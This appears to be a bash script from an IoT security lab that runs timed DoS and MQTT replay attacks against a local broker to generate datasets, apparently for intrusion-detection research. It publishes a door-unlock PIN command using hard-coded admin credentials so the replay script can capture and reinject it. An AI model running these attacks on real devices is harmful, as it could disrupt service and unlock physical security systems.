#!/bin/bash
echo "======================================"
echo " Starting 10-Minute DoS Attack..."
echo "======================================"
# 10 minutes = 600 seconds
python3 attacks/dos_attack_advanced.py --botnet --duration 600 --clients 5

echo ""
echo "======================================"
echo " Starting 10-Minute Replay Attack..."
echo "======================================"

# Run replay attack in background
python3 attacks/replay_attack.py --broker 192.168.1.100 --duration 600 --delay 2 &
REPLAY_PID=$!

# Wait 5 seconds to ensure Phase 1 (Sniffer) is actively listening
sleep 5

# Send the legitimate trigger packet so the sniffer catches it
echo "Triggering legitimate PIN packet for sniffer..."
mosquitto_pub -h 192.168.1.100 -u "admin" -P "iot@secure99" -t "shtsp/home/security/cmd" -m '{"type": "PIN", "action": "UNLOCK"}'

# Wait for the replay script to finish its 10-minute injection loop
wait $REPLAY_PID

echo "======================================"
echo " All datasets successfully generated!"
echo "======================================"
